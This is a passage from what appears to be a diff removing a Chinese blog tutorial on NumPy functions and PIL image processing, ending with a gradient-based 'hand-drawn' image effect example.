-<td align="center">np.divide(x1,x2[,y])</td>
-<td align="center">y = x1 / x2</td>
-</tr>
-<tr>
-<td align="center">np floor_divide(x1,x2[,y])</td>
-<td align="center">y = x1 // x2,返回值取整</td>
-</tr>
-<tr>
-<td align="center">np.negative(x[,y])</td>
-<td align="center">y = -x</td>
-</tr>
-<tr>
-<td align="center">np.power(x1,x2[,y])</td>
-<td align="center">y = x1 ** x2</td>
-</tr>
-<tr>
-<td align="center">np.remainder(x1,x2[,y])</td>
-<td align="center">y = x1 % x2</td>
-</tr>
-</tbody></table>
-<p>（6）下表列出了numpy库的比较运算符，该表将返回一个布尔数组，它包含两个数组中对应元素值的比较结果。其中，where()函数是三元表达式x if condition else y的矢量版本。</p>
-<table>
-<thead>
-<tr>
-<th align="center">函数</th>
-<th align="center">描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">np.equal(x1,x2[,y])</td>
-<td align="center">y = x1 == x2</td>
-</tr>
-<tr>
-<td align="center">np.not_equal(x1,x2[,y])</td>
-<td align="center">y = x1 != x2</td>
-</tr>
-<tr>
-<td align="center">np.less(x1,x2[,y])</td>
-<td align="center">y = x1 &lt; x2</td>
-</tr>
-<tr>
-<td align="center">np.less_equal(x1,x2[,y])</td>
-<td align="center">y = x1 &lt;= x2</td>
-</tr>
-<tr>
-<td align="center">np.greater(x1,x2[,y])</td>
-<td align="center">y = x1 &gt; x2</td>
-</tr>
-<tr>
-<td align="center">np.greater_equal(x1,x2[,y])</td>
-<td align="center">y = x1 &gt;= x2</td>
-</tr>
-<tr>
-<td align="center">np.where(condition[x,y])</td>
-<td align="center">根据给出的条件判断输出x还是y</td>
-</tr>
-</tbody></table>
-<pre><code class="python">&gt;&gt;&gt;import numpy as np
-&gt;&gt;&gt; np.less([1,2],[2,2])
-array([ True, False])</code></pre>
-<p>（7）numpy的其他<strong>有趣而操作方便的函数</strong>，如下表所示</p>
-<table>
-<thead>
-<tr>
-<th align="center">函数</th>
-<th align="center">描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">np.abs(x)</td>
-<td align="center">计算基于元素的整型、浮点或复数的绝对值</td>
-</tr>
-<tr>
-<td align="center">np.sqrt(x)</td>
-<td align="center">计算每个元素的平方根</td>
-</tr>
-<tr>
-<td align="center">np.squre(x)</td>
-<td align="center">计算每个元素的平方</td>
-</tr>
-<tr>
-<td align="center">np.sign(x)</td>
-<td align="center">计算每个元素的符号：1(+)、0、-1(-)</td>
-</tr>
-<tr>
-<td align="center">np.ceil(x)</td>
-<td align="center">计算大于或等于每个元素的最小值</td>
-</tr>
-<tr>
-<td align="center">np.floor(x)</td>
-<td align="center">计算小于或等于每个元素的最小值</td>
-</tr>
-<tr>
-<td align="center">np.rint(x[,out])</td>
-<td align="center">圆整，取每个元素为最近的整数，保留数据类型</td>
-</tr>
-<tr>
-<td align="center">np.exp(x[,out])</td>
-<td align="center">计算每个元素的指数值</td>
-</tr>
-<tr>
-<td align="center">np.log(x),np.log10(x),np.log2(x)</td>
-<td align="center">计算自然对数(e)，基于10、2的对数，log(1+x)</td>
-</tr>
-</tbody></table>
-<p>（8）numpy库还包括<strong>三角运算函数、傅里叶变换、随机和概率分布、基本数值统计、位运算、矩阵运算等非常丰富的功能</strong>。可在官网查询。</p>
-<h2 id="图像的手绘效果"><a href="#图像的手绘效果" class="headerlink" title="图像的手绘效果"></a>图像的手绘效果</h2><p><strong>这是一个使用numpy和PIL库提取图像特征形成手绘效果的实例</strong></p>
-<h3 id="图像的数组表示"><a href="#图像的数组表示" class="headerlink" title="图像的数组表示"></a>图像的数组表示</h3><p>（1）图像是有规则的二维数据，可以用numpy库将图像转换成数组对象。</p>
-<pre><code class="python">&gt;&gt;&gt; from PIL import Image
-&gt;&gt;&gt; import numpy as np
-&gt;&gt;&gt; im = np.array(Image.open(&#39;01.jpg&#39;))#open()中为图片存放路径，该路径不得出现中文。可用相对路径
-&gt;&gt;&gt; print(im.shape,im.dtype)
-(1711, 2560, 3) uint8</code></pre>
-<p>（2）图像转换对应的ndarray类型是<strong>三维数据</strong>，如（881,1266,3），其中，前两维表示图像的<strong>长度和宽度</strong>，单位是<strong>像素</strong>，第三维表示每个像素点的<strong>RGB</strong>值，每个RGB值是一个单字节整数。</p>
-<p>（3）PIL库包括图像转换函数，能够改变图像单个像素的表示形式。<strong>使用convert()函数，这是’L’模式，表示将像素从RGB的3字节形式转变为单一数值形式，这个数值范围为0~255，表示灰度色彩变化。</strong>此时，图像从彩色变为带有灰度的黑白色。<strong>转换后，图像的adarray类型变为二维数据，</strong>每个像素点色彩只由一个整数表示。</p>
-<pre><code class="python">&gt;&gt;&gt; im = np.array(Image.open(&#39;01.jpg&#39;).convert(&#39;L&#39;))
-&gt;&gt;&gt; print(im.shape,im.dtype)
-(1711, 2560) uint8</code></pre>
-<p>（4）通过对图像的数组转换，可以利用numpy访问图像上的任意像素值。例如，获取位于坐标(20,300)像素的颜色值或获取图像中最大和最小的像素值。也可以采用切片方式获取指定行或列的元素值，甚至修改这些值。</p>
-<pre><code class="python">&gt;&gt;&gt; print(im[20,300])
-220
-&gt;&gt;&gt; print(int(im.min()),int(im.max()))
-0 255
-&gt;&gt;&gt; print(im[10,:])   #获取坐标x=10的所有像素点的值
-[246 246 246 ...  47  47  47]</code></pre>
-<p>（5）<strong>将图像读入ndarray数组对象后，可以通过任意数学操作来获取相应的图像变换。</strong>以灰度变换为例，分别对灰度变化后的图像进行<strong>反变换、区间变化和像素值平方处理。</strong></p>
-<ul>
-<li>注意：有些数学变换会改变图像的数据类型，如变成整数类型等，所以在<strong>重新生成PIL图像前要先将数据类型通过numpy.uint()变换成整数。</strong></li>
-</ul>
-<pre><code class="python">&gt;&gt;&gt; from PIL import Image
-&gt;&gt;&gt; import numpy as np
-&gt;&gt;&gt; im0 = np.array(Image.open(&#39;01.jpg&#39;).convert(&#39;L&#39;))
-&gt;&gt;&gt; im1 = 255 - im0     #反变换
-&gt;&gt;&gt; im2 = (100/255)*im0 + 150    #区间变换
-&gt;&gt;&gt; im3 = 255*(im1/255)**2       #像素平方处理
-&gt;&gt;&gt; pil_im = Image.fromarray(np.uint(im1))
-&gt;&gt;&gt; pil_im.show()
-&gt;&gt;&gt; pil_im = Image.fromarray(np.uint(im2))
-&gt;&gt;&gt; pil_im.show()
-&gt;&gt;&gt; pil_im = Image.fromarray(np.uint(im3))
-&gt;&gt;&gt; pil_im.show()</code></pre>
-<ul>
-<li>原图像</li>
-</ul>
-<p><img src="https://i.loli.net/2021/04/16/wxBbIqke2Yg39z5.png" alt="image-20210416153015688"></p>
-<ul>
-<li>对im1执行结果</li>
-</ul>
-<p><img src="https://i.loli.net/2021/04/16/ylFrb7gNPiwvZXx.png" alt="image-20210416153206984"></p>
-<ul>
-<li>对im2执行结果</li>
-</ul>
-<p><img src="https://i.loli.net/2021/04/16/VOraQjwLHiRk1PU.png" alt="image-20210416153347977"></p>
-<ul>
-<li>对im3执行结果</li>
-</ul>
-<p><img src="https://i.loli.net/2021/04/16/yq2GjIDdptJ4X6Z.png" alt="image-20210416153503923"></p>
-<h3 id="扩展：灰度值"><a href="#扩展：灰度值" class="headerlink" title="扩展：灰度值"></a>扩展：灰度值</h3><p>（1）灰度值指黑白图像中点的颜色深度，范围从0到255，黑色为0，白色为255。因此，黑白图像也被称为灰度图像。</p>
-<p>（2）RGB彩色图片可以通过如下公式转换成灰度值：</p>
-<ul>
-<li>Gray=R<em>0.3+G\</em>0.59+B*0.11</li>
-</ul>
-<h3 id="图像的手绘效果-1"><a href="#图像的手绘效果-1" class="headerlink" title="图像的手绘效果"></a>图像的手绘效果</h3><p>（1）获得铅笔画风格图像常采用ImageFilter.CONTOUR滤镜，它能够将图像的轮廓信息提取出来，但却缺乏立体感。可由程序给出图像的手绘效果，让图像更具立体感。</p>
-<ul>
-<li>图像轮廓</li>
-</ul>
-<p><img src="https://i.loli.net/2021/04/16/8WoF4DqVz1YsagP.png" alt="image-20210416160955896"></p>
-<p>（2）为实现手绘风格，首先需要读取原图像的明暗变化，<strong>即灰度值。</strong></p>
-<p>（3）从直观视觉感受上定义，图像灰度值显著变化的地方就是梯度，它描述了图像灰度变化的强度。</p>
-<p>（4）通常可以使用梯度计算来提取图像轮廓，numpy中提供了直接获取灰度图像梯度的函数gradient()，传入图像数组表示即可返回代表x和y各自方向上梯度变化的二维元组。</p>
-<pre><code class="python">from PIL import Image
-import numpy as np
-vec_el = np.pi/2.2      #光源的俯视角度，弧度值
-vec_az = np.pi/4.       #光源的方位角度，弧度值
-depth = 10.             #0-100
-im = Image.open(&#39;01.jpg&#39;).convert(&#39;L&#39;)
-a = np.asarray(im).astype(&#39;float&#39;)   #astype实现变量类型转换
-grad = np.gradient(a)   #取图像灰度的梯度值
-grad_x, grad_y = grad   #分别取横纵图像梯度值
-grad_x = grad_x*depth/100.
-grad_y = grad_y*depth/100.
-dx = np.cos(vec_el)*np.cos(vec_az) #光源对x轴的影响
-dy = np.cos(vec_el)*np.sin(vec_az) #光源对y轴的影响
-dz = np.sin(vec_el)                #光源对z轴的影响
-A = np.sqrt(grad_x**2 + grad_y**2 + 1.)
-uni_x = grad_x/A
-uni_y = grad_y/A
-uni_z = 1./A
-a2 = 255*(dx*uni_x + dy*uni_y +dz*uni_z) #光源归一化
-a2 = a2.clip(0,255)
-im2 = Image.fromarray(a2.astype(&#39;uint8&#39;))#重构图像
-im2.save(&#39;fcityHandDraw.jpg&#39;)</code></pre>
-<ul>
-<li>手绘效果</li>
-</ul>
-<p><img src="https://i.loli.net/2021/04/16/faVxdl8psUnWJBe.png" alt="image-20210416160914116"></p>
-<p>（5）手绘图像的基本思想是利用像素之间的梯度值（而不是像素本身）重构每个像素值。为了体现光照效果，<strong>设计一个光源，</strong>建立光源对各点梯度值的影响函数，进而运算出新的像素值，从而体现边界点灰度变化，形成手绘效果。</p>
-<p>（6）为了更好的立体感，<strong>增加一个z方向梯度值</strong>，并给x和y方向梯度值赋权值depth。这种坐标空间变化相当于给物体加上一个虚拟光源，根据灰度值大小模拟各部分相对于人视角的远近程度，使画面显得有“深度”。</p>
-<p>（7）在利用梯度重构图像时，对应不同梯度取0~255之间不同的灰度值，<strong>depth</strong>的作用在于调节这个对应关系。</p>
-<ul>
-<li>depth较小时，背景区域接近白色，画面显示轮廓描绘；</li>
-<li>depth较大时，整体画面灰度值较深，近似于浮雕效果</li>
-</ul>
-<p>（8）将光源定义为3个参数：<strong>方位角vec_az、俯视角vec_el和深度权值depth</strong>。两个角度的设定和单位向量构成了基础的柱坐标系，体现物体相对于虚拟光源的位置。例如代码的第3行到第5行。</p>
-<p>（9）通过<strong>np.gradient()函数</strong>计算图像梯度值作为新色彩计算的基础。为了更直观地进行计算，可以把角度对应的柱坐标转换为xyz立体坐标系。dx、dy、dz是像素点在施加模拟光源后在x、y、z方向上明暗变化的加权向量，如代码第12到第14行。</p>
-<p>（10）A是梯度值，也是梯度大小。<strong>各个方向上总梯度除以幅值得到每个像素单元的梯度值</strong>。利用每个单元的梯度值和方向加权向量合成灰度值，<strong>clip函数用于预防溢出</strong>，并归一化到0~255区间。最后从数组中恢复图像并保存。</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Python</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/04/10/Python/%E8%BF%90%E7%94%A8Python%E8%AF%AD%E8%A8%80(%E4%B8%89)-%E7%A7%91%E5%AD%A6%E8%AE%A1%E7%AE%97%E5%92%8C%E5%8F%AF%E8%A7%86%E5%8C%9601/">展开全文 >></a>
         </p>
       
 
